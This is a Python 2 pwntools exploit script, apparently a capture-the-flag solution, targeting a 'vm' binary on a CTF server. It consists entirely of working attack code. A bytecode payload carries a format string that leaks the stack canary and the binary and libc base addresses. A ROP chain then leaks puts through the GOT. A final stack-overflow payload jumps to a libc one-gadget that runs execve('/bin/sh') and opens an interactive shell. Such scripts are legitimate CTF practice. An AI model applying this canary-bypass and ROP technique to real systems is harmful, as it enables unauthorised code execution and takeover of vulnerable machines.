#!/usr/bin/env python2

from pwn import *

context.update(arch='amd64', os='linux')

b = ELF('./vm')
l = ELF('./libc-2.27.so')

context(binary=b)

r = remote('vm.ctf.cuctf.io', 9800)

def vm_exec_leak():
    leak = '-'.join(['%lx']*30)
    length = p8(len(leak))

    payload  = ''
    payload += '\x01' # Increment to val = 1
    payload += '\x03' # Multiply by length leak
    payload += length # val = 1 * length leak
    payload += '\x05' # Copy to buffer
    payload += leak   # Format string
    payload += '\x00' # Print buffer & Halt

    r.recvuntil("VM>")
    r.sendline(payload)
    res = r.recvuntil("$")[:-1].split("-")

    binary_base = int(res[24], 16) & 0xFFFFFFFFF000
    stack_canary = int(res[26], 16)
    '''
    readelf -s libc-ubuntu | grep "libc_start"
      2203: 0000000000021ab0 ... __libc_start_main@@GLIBC_2.2.5
    '''
    libc_base = int(res[28], 16) - 0x21ab0 - 243 # (__libc_start_main+243)

    return stack_canary, libc_base, binary_base

def test_prompt_rop(stack_canary, libc_base, binary_base):
    b.address = binary_base

    rop = ROP(b)
    rop.puts(b.got['puts'])
    rop.call(b.symbols['test'])

    payload = ''
    payload += "A" * 136
    payload += p64(stack_canary)
    payload += p64(0x00000000000000)  # Fill frame ptr with junk
    payload += str(rop)

    r.recvuntil("test$")
    r.sendline(payload)

    r.recvuntil("A\n")
    leaked_puts = r.recvn(6).ljust(8, '\x00')
    l.address = u64(leaked_puts) - l.symbols['puts']

    payload = ''
    payload += "A" * 136
    payload += p64(stack_canary)
    payload += p64(0x00000000000000000) # Fill frame ptr with junk
    payload += p64(l.address + 0x3eb0b) # pop rcx; ret;
    payload += p64(0x00000000000000000) # NULL; One-Gadget constraint
    payload += p64(l.address + 0x4f2c5) # execve("/bin/sh", rsp+0x40, environ)

    r.sendline(payload)

r.recvuntil("$")
r.sendline("advanced")

stack_canary, libc_base, binary_base = vm_exec_leak()

log.success("Stack Canary: " + hex(stack_canary))
log.success("Libc Base Addr: " + hex(libc_base))
log.success("Binary Base Addr: " + hex(binary_base))

r.sendline("test-prompt")

test_prompt_rop(stack_canary, libc_base, binary_base)

r.interactive()
